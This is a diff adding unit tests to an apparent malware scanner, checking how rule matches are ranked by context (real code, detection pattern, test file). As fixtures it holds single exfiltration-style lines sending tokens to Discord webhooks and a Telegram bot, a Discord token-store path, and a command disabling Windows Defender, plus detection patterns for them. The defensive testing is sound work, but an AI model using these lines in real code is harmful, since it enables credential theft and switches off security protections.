@@ -114,3 +114,71 @@ describe("reputation", () => {
     expect(reputationFindings(null, null, release, {}, now)[0]?.severity).toBe("high");
   });
 });
+
+describe("match context", () => {
+  const hitFor = (text: string, path: string, id: string) => scanText(text, path).find((h) => h.rule.id === id);
+
+  it("keeps full severity for real code", () => {
+    const h = hitFor(
+      'post("https://discord.com/api/webhooks/123456/abcDEF", tokens);',
+      "src/Loader.java",
+      "discord-webhook",
+    );
+    expect(h?.context).toBe("code");
+    expect(h?.severity).toBe("high");
+  });
+
+  it("keeps full severity for Windows paths with backslashes", () => {
+    const h = hitFor(
+      String.raw`Path p = Paths.get(appData + "\discord\Local Storage\leveldb");`,
+      "src/Loader.java",
+      "discord-token-paths",
+    );
+    expect(h?.context).toBe("code");
+    expect(h?.severity).toBe("critical");
+  });
+
+  it("lowers matches inside detection patterns (security tools, rule lists)", () => {
+    const h = hitFor(String.raw`  pattern: /discord\/Local Storage\/leveldb/i,`, "src/rules.ts", "discord-token-paths");
+    expect(h?.context).toBe("pattern");
+    expect(h?.severity).toBe("low");
+  });
+
+  it("lowers matches in tests and docs", () => {
+    const h = hitFor("Set-MpPreference -DisableRealtimeMonitoring $true", "tests/rules.cases.ts", "defender-tamper");
+    expect(h?.context).toBe("test");
+    expect(h?.severity).toBe("low");
+    expect(
+      hitFor("Set-MpPreference -DisableRealtimeMonitoring $true", "src/Payload.ps1", "defender-tamper")?.severity,
+    ).toBe("critical");
+  });
+
+  it("still catches the real use further down a file that also defines the pattern", () => {
+    const text = [
+      'const EXAMPLE = new RegExp("api.telegram.org/bot1:x");',
+      "// ...",
+      'fetch("https://api.telegram.org/bot123456:AAH-abc/sendDocument", { body: stolen });',
+    ].join("\n");
+    const h = hitFor(text, "src/index.js", "telegram-bot");
+    expect(h?.context).toBe("code");
+    expect(h?.severity).toBe("high");
+  });
+
+  it("doesn't treat a test folder inside a release archive path as safe for the archive itself", () => {
+    expect(
+      hitFor("Set-MpPreference -DisableRealtimeMonitoring $true", "mod.jar!/a/Run.class", "defender-tamper")?.context,
+    ).toBe("code");
+  });
+});
+
+describe("match context sanity", () => {
+  it("the pattern examples above really trigger the rules", () => {
+    expect(
+      scanText(String.raw`  pattern: /discord\/Local Storage\/leveldb/i,`, "x.ts").map((h) => h.rule.id),
+    ).toContain("discord-token-paths");
+    const h = scanText('const EXAMPLE = new RegExp("api.telegram.org/bot1:x");', "x.ts").find(
+      (x) => x.rule.id === "telegram-bot",
+    );
+    expect(h?.context).toBe("pattern");
+  });
+});
